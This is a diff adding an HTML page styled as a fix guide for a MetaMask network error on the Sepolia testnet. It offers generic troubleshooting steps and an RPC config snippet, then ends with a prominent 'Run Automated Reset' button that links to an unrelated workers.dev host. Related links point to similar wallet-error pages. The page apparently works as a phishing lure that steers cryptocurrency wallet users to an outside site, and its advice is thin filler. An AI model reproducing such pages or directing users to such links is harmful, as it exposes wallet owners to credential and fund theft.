@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Network Error When Switching To Sepolia – Fix Guide</title>
+<style>
+    body {
+        font-family: sans-serif;
+        background: #0a0c10;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff9455; }
+    .btn {
+        background: #cf6679;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Network Error When Switching To Sepolia</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users encounter a network error when attempting to switch to the Sepolia test network using the Metamask extension, resulting in a failed network transition and potential loss of access to testnet assets.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to outdated network configuration or incorrect RPC endpoint settings for the Sepolia test network within the Metamask extension.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>Update the Metamask extension to the latest version to ensure compatibility with the Sepolia test network.</li>
+<li>Verify that the RPC endpoint for Sepolia is correctly configured: </li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">11155111</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;chainName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Sepolia&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;rpcUrls&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;https://sepolia.eth.api.ovh/&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;nativeCurrency&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Ether&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ETH&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<ul>
+<li>Reset the Metamask network settings to default values to eliminate any conflicting configurations.</li>
+</ul>
+<p>Prerequisites:
+* Metamask extension installed and enabled
+* Basic understanding of Ethereum test networks
+* Access to the Sepolia test network RPC endpoint</p>
+<p>Consider utilizing an external console to directly interact with the Ethereum network for advanced troubleshooting and configuration.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tron-test-error.html">TRON test error</a></li><li><a href="./archive/2026/06/eth-test-error.html">ETH Test Error</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
